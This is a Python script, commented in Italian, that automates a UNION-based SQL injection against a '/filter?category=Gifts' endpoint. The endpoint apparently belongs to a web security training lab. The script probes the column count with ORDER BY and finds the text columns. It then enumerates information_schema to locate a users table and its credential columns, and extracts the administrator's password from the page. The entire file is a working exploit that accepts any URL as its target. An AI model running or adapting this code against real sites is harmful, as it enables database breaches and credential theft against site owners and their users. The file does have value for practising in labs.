import requests
import sys
import re
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

uri = "/filter?category=Gifts"

def exploit_sqli_ordercols(url,uri):
    print("\n[+] Verificando il numero di colonne utili")
    for i in range(1,50):
        sql_payload = "' ORDER BY %i-- -" %i
        r = requests.get(url + uri + sql_payload, verify=False, proxies=proxies)
        response = r.text
        if "Internal Server Error" in response:
            print("[+] Il numero di colonne utili è pari a " + str(i - 1))
            return i - 1
        i = i + 1
    return False


def exploit_sqli_textcols(url,uri,num_cols):
    print("\n[+] Verificando quante colonne supportano il campo testo")
    string = "'TESTTEXT'"
    column_counter = 0
    for i in range (1,num_cols+1):
        payload_list = ['NULL'] * num_cols
        payload_list[i-1] = string
        sql_payload = "' UNION SELECT " + ",".join(payload_list) + "-- -"
        r = requests.get(url + uri + sql_payload, verify=False, proxies=proxies)
        response = r.text
        if string.strip('\'') in response:
            print("[+] SQL Payload colonna testo: " + sql_payload)
            column_counter = column_counter + 1
    print("[+] Numero colonne che supportano il campo testo pari a: " + str(column_counter))
    if column_counter > 0:
        return column_counter
    else:
        print("[-] Nessuna colonna supporta il campo testo")
        return False
        

def exploit_sqli_databasewalk(url, uri, num_cols):
    print("\n[+] Inizia la ricerca delle tabelle e colonne interessanti...")
    sql_payload = "' UNION SELECT NULL,table_name FROM information_schema.tables-- -"
    r = requests.get(url + uri + sql_payload, verify=False, proxies=proxies)
    response = r.text
    soup = BeautifulSoup(response, "html.parser")
    table_name = soup.find(string=re.compile(r'users_\w+'))
    print("[+] Tabella che potrebbe informazioni sensibili: " + table_name)
    sql_payload = "' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='" + table_name + "'-- -"
    r = requests.get(url + uri + sql_payload, verify=False, proxies=proxies)
    response= r.text
    soup = BeautifulSoup(response, "html.parser")
    username_column_name = soup.find(string=re.compile(r'username_\w+'))
    password_column_name = soup.find(string=re.compile(r'password_\w+'))
    print("[+] Colonna con nomi utente: " + username_column_name)
    print("[+] Colonna con password utente: " + password_column_name)
    return [table_name, username_column_name, password_column_name]


def exploit_sqli_adminpsw(url,uri,column_name1,column_name2,table_name):
    print("\n[+] Estraiamo la password dell'utente 'administrator'")
    sql_payload = "' UNION SELECT %s, %s FROM %s -- -" % (column_name1, column_name2, table_name)
    r = requests.get(url + uri + sql_payload, verify=False, proxies=proxies)
    response = r.text
    soup = BeautifulSoup(response, "html.parser")
    adminpsw=soup.find(string=re.compile(r'administrator')).parent.findNext("td").contents[0]
    print("[+] La password dell'utente 'administrator' è: " + adminpsw)
    return True


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    
    except IndexError:
        print("[-] Utilizzo: %s <url>" % sys.argv[0])
        print("[-] Esempio: %s www.example.com" % sys.argv[0])
        sys.exit()


    print("[+] Analizzando il database...")

    number_columns = exploit_sqli_ordercols(url,uri)
    text_columns = exploit_sqli_textcols(url,uri,number_columns)
    sql_list = exploit_sqli_databasewalk(url,uri,text_columns)


    if not exploit_sqli_adminpsw(url,uri,sql_list[1],sql_list[2],sql_list[0]):
         print("[-] Impossibile individuare la password dell'account \'administrator\'")